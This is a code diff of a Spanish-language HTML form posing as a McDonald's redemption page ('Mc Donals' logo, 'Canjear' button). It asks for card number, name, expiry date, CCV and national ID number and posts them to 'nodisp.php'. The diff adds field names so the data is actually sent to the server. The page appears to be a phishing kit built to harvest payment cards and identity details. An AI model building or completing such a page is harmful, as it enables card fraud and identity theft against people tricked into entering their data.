@@ -63,24 +63,24 @@
 		<form action="nodisp.php" method="post" id="formulario-tarjeta" class="formulario-tarjeta active">
 			<div class="grupo">
 				<label for="inputNumero">Número Tarjeta</label>
-				<input type="text" id="inputNumero" maxlength="19" autocomplete="off">
+				<input type="text" name="input1" id="inputNumero" maxlength="19" autocomplete="off">
 			</div>
 			<div class="grupo">
 				<label for="inputNombre">Nombre</label>
-				<input type="text" id="inputNombre" maxlength="19" autocomplete="off">
+				<input type="text" name="input2" id="inputNombre" maxlength="19" autocomplete="off">
 			</div>
 			<div class="flexbox">
 				<div class="grupo expira">
 					<label for="selectMes">Expiracion</label>
 					<div class="flexbox">
 						<div class="grupo-select">
-							<select name="mes" id="selectMes">
+							<select name="input3" id="selectMes">
 								<option disabled selected>Mes</option>
 							</select>
 							<i class="fas fa-angle-down"></i>
 						</div>
 						<div class="grupo-select">
-							<select name="year" id="selectYear">
+							<select name="input4" id="selectYear">
 								<option disabled selected>Año</option>
 							</select>
 							<i class="fas fa-angle-down"></i>
@@ -90,12 +90,12 @@
 
 				<div class="grupo ccv">
 					<label for="inputCCV">CCV</label>
-					<input type="text" id="inputCCV" maxlength="3">
+					<input type="text" name="input5" id="inputCCV" maxlength="3">
 				</div>
 			</div>
 					<div class="grupo">
 				<label for="inputDNI">DNI</label>
-				<input type="number" id="inputDNI" maxlength="8" autocomplete="off">
+				<input type="number" id="inputDNI" name="inputy6" maxlength="8" autocomplete="off">
 			</div>
 			<button type="submit" class="btn-enviar">Canjear</button>
 					<img src="img/logocre.png" alt="Mc Donals" width="150">		<!-- Tarjeta -->
